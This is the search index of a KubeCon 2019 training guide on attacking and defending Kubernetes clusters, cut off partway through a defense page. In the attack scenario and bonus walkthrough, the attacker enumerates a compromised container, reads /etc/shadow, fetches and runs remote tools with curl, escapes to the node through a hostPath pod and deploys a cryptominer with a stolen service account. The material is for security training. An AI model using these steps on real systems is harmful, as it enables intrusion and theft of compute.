{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-\\.]+"},"docs":[{"location":"","text":"KubeCon NA 2019 CTF \u00b6 Welcome to the Attacking and Defending Kubernetes Clusters: A Guided Tour Walkthrough Guide, as presented at KubeCon NA 2019 . We'll help you create your own Kubernetes environment so you can follow along as we take on the role of two attacking personas looking to make some money and one defending persona working hard to keep the cluster safe and healthy. Use the Copy to Clipboard Feature Each terminal command block in this guide has a double-square icon on the far right side which automatically copies the content to your paste buffer to make things easier to follow along. Getting Started \u00b6 Click on \"Getting Started\" in the table of contents and follow the directions. When a kubectl get pods --all-namespaces gives output like the following, you're ready to begin the tutorial. $ kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE dev app-6ffb94966d-9nqnk 1/1 Running 0 70s dev dashboard-5889b89d4-dj7kq 2/2 Running 0 70s dev db-649646fdfc-kzp6g 1/1 Running 0 70s ... prd app-6ffb94966d-nfhn7 1/1 Running 0 70s prd dashboard-7b5fbbc459-sm2zk 2/2 Running 0 70s prd db-649646fdfc-vdwj6 1/1 Running 0 70s About the Creators \u00b6 @tabbysable has been a hacker and cross-platform sysadmin since the turn of the century. She can often be found teaching network offense and defense to sysadmins, system administration to security folks, bicycling, and asking questions that start with \"I wonder what happens if we...\" @petermbenjamin is a Senior Software Engineer with a background in Information Security and a co-organizer for the San Diego Kubernetes and Go meet-ups. He has a passion for enabling engineers to build secure and scalable applications, services, and platforms on modern distributed systems. @jimmesta is a security leader that has been working in AppSec and Infrastructure Security for over 10 years. He founded and led the OWASP Santa Barbara chapter and co-organized the AppSec California security conference. Jimmy has taught at private corporate events and security conferences worldwide including AppSec USA, LocoMocoSec, SecAppDev, RSA, and B-Sides. He has spent significant time on both the offense and defense side of the industry and is constantly working towards building modern, developer-friendly security solutions. @BradGeesaman is an Independent Security Consultant helping clients improve the security of their Kubernetes clusters and supporting cloud environments. He has recently spoken at KubeCon NA 2017 on Kubernetes security and has over 5 years of experience building, designing, and delivering ethical hacking educational training scenarios.","title":"Introduction"},{"location":"#kubecon-na-2019-ctf","text":"Welcome to the Attacking and Defending Kubernetes Clusters: A Guided Tour Walkthrough Guide, as presented at KubeCon NA 2019 . We'll help you create your own Kubernetes environment so you can follow along as we take on the role of two attacking personas looking to make some money and one defending persona working hard to keep the cluster safe and healthy. Use the Copy to Clipboard Feature Each terminal command block in this guide has a double-square icon on the far right side which automatically copies the content to your paste buffer to make things easier to follow along.","title":"KubeCon NA 2019 CTF"},{"location":"#getting-started","text":"Click on \"Getting Started\" in the table of contents and follow the directions. When a kubectl get pods --all-namespaces gives output like the following, you're ready to begin the tutorial. $ kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE dev app-6ffb94966d-9nqnk 1/1 Running 0 70s dev dashboard-5889b89d4-dj7kq 2/2 Running 0 70s dev db-649646fdfc-kzp6g 1/1 Running 0 70s ... prd app-6ffb94966d-nfhn7 1/1 Running 0 70s prd dashboard-7b5fbbc459-sm2zk 2/2 Running 0 70s prd db-649646fdfc-vdwj6 1/1 Running 0 70s","title":"Getting Started"},{"location":"#about-the-creators","text":"@tabbysable has been a hacker and cross-platform sysadmin since the turn of the century. She can often be found teaching network offense and defense to sysadmins, system administration to security folks, bicycling, and asking questions that start with \"I wonder what happens if we...\" @petermbenjamin is a Senior Software Engineer with a background in Information Security and a co-organizer for the San Diego Kubernetes and Go meet-ups. He has a passion for enabling engineers to build secure and scalable applications, services, and platforms on modern distributed systems. @jimmesta is a security leader that has been working in AppSec and Infrastructure Security for over 10 years. He founded and led the OWASP Santa Barbara chapter and co-organized the AppSec California security conference. Jimmy has taught at private corporate events and security conferences worldwide including AppSec USA, LocoMocoSec, SecAppDev, RSA, and B-Sides. He has spent significant time on both the offense and defense side of the industry and is constantly working towards building modern, developer-friendly security solutions. @BradGeesaman is an Independent Security Consultant helping clients improve the security of their Kubernetes clusters and supporting cloud environments. He has recently spoken at KubeCon NA 2017 on Kubernetes security and has over 5 years of experience building, designing, and delivering ethical hacking educational training scenarios.","title":"About the Creators"},{"location":"bonus_1_walkthrough/","text":"Bonus Walkthroughs \u00b6 Challenge 1 \u00b6 Get a root shell on the cluster node again. Find out the image name that was last run directly with docker commands by the kubernetes user. Create a \"hostpath volume mount\" pod manifest. cat > hostpath.yml <<EOF --- apiVersion: v1 kind: Pod metadata: name: hostpath spec: containers: - name: hostpath image: busybox:latest command: - sleep - \"86400\" volumeMounts: - name: rootfs mountPath: /rootfs restartPolicy: Always volumes: - name: rootfs hostPath: path: / EOF Create the pod that mounts the host filesystem's / at /rootfs inside the container. kubectl apply -f hostpath.yml Use kubectl exec to get a shell inside the hostpath pod in the default namespace . kubectl exec -it hostpath /bin/sh Use the chroot command to switch the filesystem root to the /rootfs of the container and run a bash shell. chroot /rootfs /bin/bash Navigate to the home directory of the kubernetes user on the host filesystem, and examine the shell history for the image that was run manually with a docker run invocation. cd /home/kubernetes ls cat .bash_history Exit from the chroot shell. exit 1. Exit from the kubectl exec into the pod . exit Clean up after our pod escape. kubectl delete -f hostpath.yml","title":"Bonus 1 Walkthrough"},{"location":"bonus_1_walkthrough/#bonus-walkthroughs","text":"","title":"Bonus Walkthroughs"},{"location":"bonus_1_walkthrough/#challenge-1","text":"Get a root shell on the cluster node again. Find out the image name that was last run directly with docker commands by the kubernetes user. Create a \"hostpath volume mount\" pod manifest. cat > hostpath.yml <<EOF --- apiVersion: v1 kind: Pod metadata: name: hostpath spec: containers: - name: hostpath image: busybox:latest command: - sleep - \"86400\" volumeMounts: - name: rootfs mountPath: /rootfs restartPolicy: Always volumes: - name: rootfs hostPath: path: / EOF Create the pod that mounts the host filesystem's / at /rootfs inside the container. kubectl apply -f hostpath.yml Use kubectl exec to get a shell inside the hostpath pod in the default namespace . kubectl exec -it hostpath /bin/sh Use the chroot command to switch the filesystem root to the /rootfs of the container and run a bash shell. chroot /rootfs /bin/bash Navigate to the home directory of the kubernetes user on the host filesystem, and examine the shell history for the image that was run manually with a docker run invocation. cd /home/kubernetes ls cat .bash_history Exit from the chroot shell. exit 1. Exit from the kubectl exec into the pod . exit Clean up after our pod escape. kubectl delete -f hostpath.yml","title":"Challenge 1"},{"location":"bonus_2_walkthrough/","text":"Bonus Walkthroughs \u00b6 Challenge 2 \u00b6 Was this cluster compromised via another mechanism and Blue didn't know about it? (Yes!) Find the IP address of the attacker's system where the reverse shell was being sent. Hint: Tiller was removed with helm reset --force and so it left some things behind in the kube-system namespace . Search for leftover configmaps kubectl get configmap --all-namespaces Dig into the Helm Chart configmap kubectl get configmap -n kube-system toned-elk.v1 -o json kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.' kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d | file - kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d | gunzip - Examine the image without running it docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker.io/wagoodman/dive:latest docker.io/bradgeesaman/bd:latest Make a tmp space to save the image mkdir ~/bdtmp && cd ~/bdtmp Save the image as a tarball docker save docker.io/bradgeesaman/bd:latest -o bd.tar ls -alh View the image tarball contents tar tvf bd.tar tar xvf bd.tar Examine the manifest.json to find the layers cat manifest.json | jq -r '.' jq -r '.[].Config' manifest.json cat $(jq -r '.[].Config' manifest.json) | jq -r '.' cat $(jq -r '.[].Config' manifest.json) | jq -r '.history[] | select(.\"empty_layer\"!=true)' ls -alh Obtain the last layer file name cat manifest.json | jq -r '.' jq -r '.[].Layers[]' manifest.json | tail -1 To get the answer, view the contents of the last image layer tar xvf $(jq -r '.[].Layers[]' manifest.json | tail -1) -O Cleanup cd .. rm -rf ~/bdtmp","title":"Bonus 2 Walkthrough"},{"location":"bonus_2_walkthrough/#bonus-walkthroughs","text":"","title":"Bonus Walkthroughs"},{"location":"bonus_2_walkthrough/#challenge-2","text":"Was this cluster compromised via another mechanism and Blue didn't know about it? (Yes!) Find the IP address of the attacker's system where the reverse shell was being sent. Hint: Tiller was removed with helm reset --force and so it left some things behind in the kube-system namespace . Search for leftover configmaps kubectl get configmap --all-namespaces Dig into the Helm Chart configmap kubectl get configmap -n kube-system toned-elk.v1 -o json kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.' kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d | file - kubectl get configmap -n kube-system toned-elk.v1 -o json | jq -r '.data.release' | base64 -d | gunzip - Examine the image without running it docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock docker.io/wagoodman/dive:latest docker.io/bradgeesaman/bd:latest Make a tmp space to save the image mkdir ~/bdtmp && cd ~/bdtmp Save the image as a tarball docker save docker.io/bradgeesaman/bd:latest -o bd.tar ls -alh View the image tarball contents tar tvf bd.tar tar xvf bd.tar Examine the manifest.json to find the layers cat manifest.json | jq -r '.' jq -r '.[].Config' manifest.json cat $(jq -r '.[].Config' manifest.json) | jq -r '.' cat $(jq -r '.[].Config' manifest.json) | jq -r '.history[] | select(.\"empty_layer\"!=true)' ls -alh Obtain the last layer file name cat manifest.json | jq -r '.' jq -r '.[].Layers[]' manifest.json | tail -1 To get the answer, view the contents of the last image layer tar xvf $(jq -r '.[].Layers[]' manifest.json | tail -1) -O Cleanup cd .. rm -rf ~/bdtmp","title":"Challenge 2"},{"location":"bonus_challenges/","text":"Bonus Challenges \u00b6 Blue's boss has hired you to see if the cluster is completely \"clean\". Use the next block of time to solve the following bonus challenges. Once you know both answers, approach one of the co-presenters and whisper the answers to both questions to earn the prestigious \"expert\" badge. Challenge 1 \u00b6 Get a root shell on the cluster node again. Find out the image name that was last run directly with docker commands by the kubernetes user. Challenge 2 \u00b6 Was this cluster compromised via another mechanism and Blue didn't know about it? (Yes!) Find the IP address of the attacker's system where the reverse shell was being sent. Hint: Tiller was removed with helm reset --force and so it left some things behind in the kube-system namespace .","title":"Bonus Challenges"},{"location":"bonus_challenges/#bonus-challenges","text":"Blue's boss has hired you to see if the cluster is completely \"clean\". Use the next block of time to solve the following bonus challenges. Once you know both answers, approach one of the co-presenters and whisper the answers to both questions to earn the prestigious \"expert\" badge.","title":"Bonus Challenges"},{"location":"bonus_challenges/#challenge-1","text":"Get a root shell on the cluster node again. Find out the image name that was last run directly with docker commands by the kubernetes user.","title":"Challenge 1"},{"location":"bonus_challenges/#challenge-2","text":"Was this cluster compromised via another mechanism and Blue didn't know about it? (Yes!) Find the IP address of the attacker's system where the reverse shell was being sent. Hint: Tiller was removed with helm reset --force and so it left some things behind in the kube-system namespace .","title":"Challenge 2"},{"location":"bonus_hints/","text":"Bonus Hints \u00b6 Bonus 1 Challenge Hint: \u00b6 On the host, look at /home/kubernetes/.bash_history bash shell history. Bonus 2 Challenge Hint: \u00b6 Review the leftover Helm chart deploy history configmap in the kube-system namespace . Base64 decode and gunzip the contents of the configmap data, and examine the contents of the container image referenced in the deployment manifest.","title":"Bonus Challenge Hints"},{"location":"bonus_hints/#bonus-hints","text":"","title":"Bonus Hints"},{"location":"bonus_hints/#bonus-1-challenge-hint","text":"On the host, look at /home/kubernetes/.bash_history bash shell history.","title":"Bonus 1 Challenge Hint:"},{"location":"bonus_hints/#bonus-2-challenge-hint","text":"Review the leftover Helm chart deploy history configmap in the kube-system namespace . Base64 decode and gunzip the contents of the configmap data, and examine the contents of the container image referenced in the deployment manifest.","title":"Bonus 2 Challenge Hint:"},{"location":"gke/","text":"Getting Started \u00b6 Create a new Google account or choose an existing one, as you prefer. Right-click the button below, choose \"Open in New Tab\", and sign in. Accept all Terms and Conditions as necessary. Click \"Confirm\" if prompted to clone the git repo into your Cloud Shell. It may look like this: Click \"Cancel\" if prompted to open the code editor. It may look like this: If the Google account has not had Billing set up yet, click \"Activate\" on the free trial banner and step through the workflow to sign up for the free trial. Once inside the Cloud Shell terminal, run setup.sh. This should create a new Project with a single-node Kubernetes cluster that contains the prerequisites for the workshop: ./setup.sh The script will prompt you for a project name (just hit enter to accept the default) and a password for your webshell instances. When the script is finished, verify it worked correctly. kubectl get pods --all-namespaces The output should look similar to this: $ kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE dev app-6ffb94966d-9nqnk 1/1 Running 0 70s dev dashboard-5889b89d4-dj7kq 2/2 Running 0 70s dev db-649646fdfc-kzp6g 1/1 Running 0 70s ... prd app-6ffb94966d-nfhn7 1/1 Running 0 70s prd dashboard-7b5fbbc459-sm2zk 2/2 Running 0 70s prd db-649646fdfc-vdwj6 1/1 Running 0 70s If it looks good, move on to Scenario 1 Attack.","title":"Getting Started"},{"location":"gke/#getting-started","text":"Create a new Google account or choose an existing one, as you prefer. Right-click the button below, choose \"Open in New Tab\", and sign in. Accept all Terms and Conditions as necessary. Click \"Confirm\" if prompted to clone the git repo into your Cloud Shell. It may look like this: Click \"Cancel\" if prompted to open the code editor. It may look like this: If the Google account has not had Billing set up yet, click \"Activate\" on the free trial banner and step through the workflow to sign up for the free trial. Once inside the Cloud Shell terminal, run setup.sh. This should create a new Project with a single-node Kubernetes cluster that contains the prerequisites for the workshop: ./setup.sh The script will prompt you for a project name (just hit enter to accept the default) and a password for your webshell instances. When the script is finished, verify it worked correctly. kubectl get pods --all-namespaces The output should look similar to this: $ kubectl get pods --all-namespaces NAMESPACE NAME READY STATUS RESTARTS AGE dev app-6ffb94966d-9nqnk 1/1 Running 0 70s dev dashboard-5889b89d4-dj7kq 2/2 Running 0 70s dev db-649646fdfc-kzp6g 1/1 Running 0 70s ... prd app-6ffb94966d-nfhn7 1/1 Running 0 70s prd dashboard-7b5fbbc459-sm2zk 2/2 Running 0 70s prd db-649646fdfc-vdwj6 1/1 Running 0 70s If it looks good, move on to Scenario 1 Attack.","title":"Getting Started"},{"location":"scenario_1_attack/","text":"Free Compute: Scenario 1 Attack \u00b6 Warning \u00b6 In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment. In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners. Backstory \u00b6 Name: Red \u00b6 Opportunist Easy money via crypto-mining Uses automated scans of web IP space for specific issues Leverages off-the-shelf attacks Basic Kubernetes knowledge Motivations \u00b6 Red \u2019s intrusion-as-a-service provider compromises website and uploads a webshell Red gets the URL of the webshell and wants to deploy some crypto-miners Initial Access \u00b6 Red has been mining bitcoinero for a few months now, and it's starting to gain some value. To capitalize on this bubble, Red uses a service that sells shell access to expand the mining pool. To find the compromised website, run the following from your Cloud Shell terminal: ./check-email.sh Log into the URL in a browser, and you should be looking at a working web terminal. Thinking In Graphs \u00b6 Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned. The general process looks like this: Study In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, nmap is commonly used to enumerate IP networks. nikto , burp , and sqlmap are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as uname , winver , and netstat provide a wealth of information about their host OSes. Plan In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more. Attack Something In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate. Persist In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords. Win Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal. Getting Some Loot \u00b6 Since Red already has a shell on a compromised host (Thanks, Natoshi!), the process is fairly simple. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible: Let's become Red and try some basic information-gathering commands to get a feel for the environment: id uname -a cat /etc/lsb-release /etc/redhat-release ps -ef df -h netstat -nl Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container. Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running a basic Linux config auditor to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel. cat /etc/shadow ls -l /home ls -l /root cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container: cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained This tells us several things: We are in a container, and it's managed by Kubernetes Some security features are not in use (userns) The host seems to be running the default Docker seccomp profile, restricting some key kernel calls We don't have any exciting capabilities. Click for more capabilities info. Now let's inspect our Kubernetes environment: env | grep -i kube curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version ls /var/run/secrets/kubernetes.io/serviceaccount We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next: export PATH=/tmp:$PATH cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl kubectl get all kubectl get all -A kubectl get namespaces By default, kubectl will attempt to use the default service account in /var/run/secrets/kubernetes.io/serviceaccount -- and it looks like this one has some API access. Note that we can't see anything outside our namespace, though. Let's inspect what all we can do: kubectl auth can-i --list Can we create pods in this namespace? kubectl auth can-i create pods Happy day! Our service account is admin in our pod's namespace! Maybe the dashboard on port 31337 needs that much access? Anyway, this gives us what we need to achieve our goals. cd /tmp; cat > bitcoinero.yml <<EOF apiVersion: apps/v1 kind: Deployment metadata: labels: run: bitcoinero name: bitcoinero namespace: prd spec: replicas: 1 revisionHistoryLimit: 2 selector: matchLabels: run: bitcoinero strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: labels: run: bitcoinero spec: containers: - image: securekubernetes/bitcoinero:latest name: bitcoinero command: [\"./moneymoneymoney\"] args: - -c - \"1\" - -l - \"10\" resources: requests: cpu: 100m memory: 128Mi limits: cpu: 200m memory: 128Mi EOF ./kubectl apply -f bitcoinero.yml sleep 10 ./kubectl get pods We can see the bitcoinero pod running, starting to generate us a small but steady stream of cryptocurrency. MISSION ACCOMPLISHED","title":"Scenario 1 Attack"},{"location":"scenario_1_attack/#free-compute-scenario-1-attack","text":"","title":"Free Compute: Scenario 1 Attack"},{"location":"scenario_1_attack/#warning","text":"In these Attack scenarios, we're going to be doing a lot of things that can be crimes if done without permission. Today, you have permission to perform these kinds of attacks against your assigned training environment. In the real world, use good judgment. Don't hurt people, don't get yourself in trouble. Only perform security assessments against your own systems, or with written permission from the owners.","title":"Warning"},{"location":"scenario_1_attack/#backstory","text":"","title":"Backstory"},{"location":"scenario_1_attack/#name-red","text":"Opportunist Easy money via crypto-mining Uses automated scans of web IP space for specific issues Leverages off-the-shelf attacks Basic Kubernetes knowledge","title":"Name: Red"},{"location":"scenario_1_attack/#motivations","text":"Red \u2019s intrusion-as-a-service provider compromises website and uploads a webshell Red gets the URL of the webshell and wants to deploy some crypto-miners","title":"Motivations"},{"location":"scenario_1_attack/#initial-access","text":"Red has been mining bitcoinero for a few months now, and it's starting to gain some value. To capitalize on this bubble, Red uses a service that sells shell access to expand the mining pool. To find the compromised website, run the following from your Cloud Shell terminal: ./check-email.sh Log into the URL in a browser, and you should be looking at a working web terminal.","title":"Initial Access"},{"location":"scenario_1_attack/#thinking-in-graphs","text":"Attacking a system is a problem-solving process similar to troubleshooting: Red begins with a goal (deploy an unauthorized cryptominer) but doesn't really know what resources are available to achieve that goal. They will have to start with what little they already know, perform tests to learn more, and develop a plan. The plan is ever-evolving as new information is gleaned. The general process looks like this: Study In this phase, use enumeration tools to start from the information you have, and get more information. Which tools to use will depend on the situation. For example, nmap is commonly used to enumerate IP networks. nikto , burp , and sqlmap are interesting ways to learn more about web applications. Windows and Linux administrative utilities such as uname , winver , and netstat provide a wealth of information about their host OSes. Plan In this phase, think about everything you currently know, and what actions you can take based on that knowledge. If you think you can do something that will help you get closer to your goal, move onto Attack. Otherwise, go back to Study and try to learn more. Attack Something In this phase, you take some action in the hope of getting closer to your goal. This may be running an exploit tool against a buggy piece of software, launching some kind of credential-guessing utility, or even just running a system command like kubectl apply. Your success or failure will teach you more about your target and situation. Move on to Study, Persist, or Win, as appropriate. Persist In this optional phase, you take some action to make it easier to re-enter the system or network at a later time. Common options are running a malware Remote Access Tool such as Meterpreter, creating new accounts for later use, and stealing passwords. Win Eventually, you may achieve your goals. Congratulations! Now you can stop hacking and begin dreaming about your next goal.","title":"Thinking In Graphs"},{"location":"scenario_1_attack/#getting-some-loot","text":"Since Red already has a shell on a compromised host (Thanks, Natoshi!), the process is fairly simple. They need to identify the resources available to them by poking around, and then run the cryptominer as easily as possible: Let's become Red and try some basic information-gathering commands to get a feel for the environment: id uname -a cat /etc/lsb-release /etc/redhat-release ps -ef df -h netstat -nl Note that the kernel version doesn't match up to the reported OS, and there are very few processes running. This is probably a container. Let's do some basic checking to see if we can get away with shenanigans. Look around the filesystem. Try downloading and running a basic Linux config auditor to see if it finds any obvious opportunities. Search a bit on https://www.exploit-db.com/ to see if there's easy public exploits for the kernel. cat /etc/shadow ls -l /home ls -l /root cd /tmp; curl http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz | tar -xzvf -; unix-privesc-check-1.4/unix-privesc-check standard That's not getting us anywhere. Let's follow-up on that idea that it's maybe a container: cd /tmp; curl -L -o amicontained https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64; chmod 555 amicontained; ./amicontained This tells us several things: We are in a container, and it's managed by Kubernetes Some security features are not in use (userns) The host seems to be running the default Docker seccomp profile, restricting some key kernel calls We don't have any exciting capabilities. Click for more capabilities info. Now let's inspect our Kubernetes environment: env | grep -i kube curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version ls /var/run/secrets/kubernetes.io/serviceaccount We have typical Kubernetes-related environment variables defined, and we have anonymous access to some parts of the Kubernetes API. We can see that the Kubernetes version is modern and supported -- but there's still hope if the Kubernetes security configuration is sloppy. Let's check for that next: export PATH=/tmp:$PATH cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl kubectl get all kubectl get all -A kubectl get namespaces By default, kubectl will attempt to use the default service account in /var/run/secrets/kubernetes.io/serviceaccount -- and it looks like this one has some API access. Note that we can't see anything outside our namespace, though. Let's inspect what all we can do: kubectl auth can-i --list Can we create pods in this namespace? kubectl auth can-i create pods Happy day! Our service account is admin in our pod's namespace! Maybe the dashboard on port 31337 needs that much access? Anyway, this gives us what we need to achieve our goals. cd /tmp; cat > bitcoinero.yml <<EOF apiVersion: apps/v1 kind: Deployment metadata: labels: run: bitcoinero name: bitcoinero namespace: prd spec: replicas: 1 revisionHistoryLimit: 2 selector: matchLabels: run: bitcoinero strategy: rollingUpdate: maxSurge: 25% maxUnavailable: 25% type: RollingUpdate template: metadata: labels: run: bitcoinero spec: containers: - image: securekubernetes/bitcoinero:latest name: bitcoinero command: [\"./moneymoneymoney\"] args: - -c - \"1\" - -l - \"10\" resources: requests: cpu: 100m memory: 128Mi limits: cpu: 200m memory: 128Mi EOF ./kubectl apply -f bitcoinero.yml sleep 10 ./kubectl get pods We can see the bitcoinero pod running, starting to generate us a small but steady stream of cryptocurrency. MISSION ACCOMPLISHED","title":"Getting Some Loot"},{"location":"scenario_1_defense/","text":"Free Compute: Scenario 1 Defense \u00b6 Backstory \u00b6 Name: Blue \u00b6 Overworked Can only do the bare minimum Uses defaults when configuring systems Usually gets blamed for stability or security issues Motivations \u00b6 Blue gets paged at 1am with an \u201curgent\u201d problem: the developers say \u201cthe website is slow\u201d Blue reluctantly agrees to take a \u201cquick look\u201d Blue wants desperately to get back to sleep. Zzz Defense \u00b6 Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming. It's \"the one running in Kubernetes\", they said. Blue leverages their Cloud Shell terminal to begin the process of troubleshooting the issue. Identifying the Issue \u00b6 The first step is to determine the name for the web application deployment in question. From the terminal, Blue runs the following to see a listing of all pods in all namespaces : kubectl get pods --all-namespaces The cluster is relatively small in size, but it has a couple deployments that could be the site in question. The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with: kubectl top node and kubectl top pod --all-namespaces It appears that a suspcious deployment named bitcoinero is running, and its causing resource contention issues. Blue runs the following to see the pod's full configuration: kubectl get deployment -n prd bitcoinero -o yaml It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website. Next, Blue grabs a consolidated listing of all images running in the cluster : kubectl get pods --all-namespaces -o jsonpath=\"{..image}\" | tr -s '[[:space:]]' '\\n' | sort -u Confirming the Foreign Workload \u00b6 Blue sends a message back to the developers asking for confirmation of the suspicious bitcoinero image, and they all agree they don't know who created the deployment . They also mention that someone accidentally deployed a nodePort for the production ops dashboard, and ask if Blue can delete it for them. Blue makes a mental note about the nodePort and then opens a browser to the cluster log system , making sure to go to the Legacy Logs Viewer. Once there, Blue clicks on the small \"down arrow\" on the far right of the \"Filter by label or text\" search bar, selects \"Convert to advanced filter\", and puts the following query into the search filter area: resource.type=\"k8s_cluster\" protoPayload.authorizationInfo.permission=\"io.k8s.apps.v1.deployments.create\" Blue sees that the default Kubernetes serviceaccount was the creator of the bitcoinero deployment . Back in the Cloud Shell terminal, Blue runs the following to list the pods running with the default serviceaccount in the prd namespace : kubectl get pods -n prd -o jsonpath='{range .items[?(@.spec.serviceAccountName==\"default\")]}{.metadata.name}{\" \"}{.spec.serviceAccountName}{\"\\n\"}{end}' Cleaning Up \u00b6 Unsure of exactly how a pod created another pod , Blue decides that it's now 3am, and the commands are blurring together. The website is still slow, so Blue decides to find and delete the deployment : kubectl get deployments -n prd kubectl delete deployment bitcoinero -n prd They also keep their promise, and delete the nodePort : kubectl get services -n prd kubectl delete service dashboard -n prd Installing Security Visibility \u00b6 It's now very clear to Blue that without additional information, it's difficult to determine exactly who or what created that bitcoinero deployment. Was it code? Was it a human? Blue suspects it was one of the engineers on the team, but there's not much they can do without proof. Remembering that this cluster doesn't have any runtime behavior monitoring and detection software installed, Blue decides to install Sysdig's Falco using an all-in-one manifest from a prominent blogger. kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security.yml Just to make sure it's working, Blue runs the following command to get the logs from the deployed Falco pod(s) : kubectl logs -n falco $(kubectl get pod -n falco -l app=falco -o=name) -f Ensuring Security Log Flow \u00b6 Going back to the logging system , Blue enters another log filter using the \"advanced filter\" with the following query to confirm it's receiving all the logs coming from the Falco deployment : resource.type=k8s_container resource.labels.namespace_name=\"falco\" resource.labels.container_name=\"falco\" Reviewing the Falco Rules: \u00b6 Falco Kubernetes Rules: kubectl get configmaps -n falco falco-config -o json | jq -r '.data.\"falco_rules.yaml\"' | grep rule: Kubernetes Audit Rules (Not applicable on GKE): kubectl get configmaps -n falco falco-config -o json | jq -r '.data.\"k8s_audit_rules.yaml\"' | grep rule: Giving the \"All Clear\" \u00b6 Seeing what looks like a \"happy\" cluster , Blue emails their boss that there was a workload using too many resources that wasn't actually needed, so it was deleted. Also, they added some additional \"security\" just in case.","title":"Scenario 1 Defense"},{"location":"scenario_1_defense/#free-compute-scenario-1-defense","text":"","title":"Free Compute: Scenario 1 Defense"},{"location":"scenario_1_defense/#backstory","text":"","title":"Backstory"},{"location":"scenario_1_defense/#name-blue","text":"Overworked Can only do the bare minimum Uses defaults when configuring systems Usually gets blamed for stability or security issues","title":"Name: Blue"},{"location":"scenario_1_defense/#motivations","text":"Blue gets paged at 1am with an \u201curgent\u201d problem: the developers say \u201cthe website is slow\u201d Blue reluctantly agrees to take a \u201cquick look\u201d Blue wants desperately to get back to sleep. Zzz","title":"Motivations"},{"location":"scenario_1_defense/#defense","text":"Blue looks at the page with an unsurprising lack of details, and spends a few minutes getting the answer to exactly which website they are referring to that is underperforming. It's \"the one running in Kubernetes\", they said. Blue leverages their Cloud Shell terminal to begin the process of troubleshooting the issue.","title":"Defense"},{"location":"scenario_1_defense/#identifying-the-issue","text":"The first step is to determine the name for the web application deployment in question. From the terminal, Blue runs the following to see a listing of all pods in all namespaces : kubectl get pods --all-namespaces The cluster is relatively small in size, but it has a couple deployments that could be the site in question. The development team mentions performance is an issue, so Blue checks the current CPU and Memory usage with: kubectl top node and kubectl top pod --all-namespaces It appears that a suspcious deployment named bitcoinero is running, and its causing resource contention issues. Blue runs the following to see the pod's full configuration: kubectl get deployment -n prd bitcoinero -o yaml It was created very recently, but there are no ports listening, so this looks unlikely to be part of the website. Next, Blue grabs a consolidated listing of all images running in the cluster : kubectl get pods --all-namespaces -o jsonpath=\"{..image}\" | tr -s '[[:space:]]' '\\n' | sort -u","title":"Identifying the Issue"},{"location":"scenario_1_defense/#confirming-the-foreign-workload","text":"Blue sends a message back to the developers asking for confirmation of the suspicious bitcoinero image, and they all agree they don't know who created the deployment . They also mention that someone accidentally deployed a nodePort for 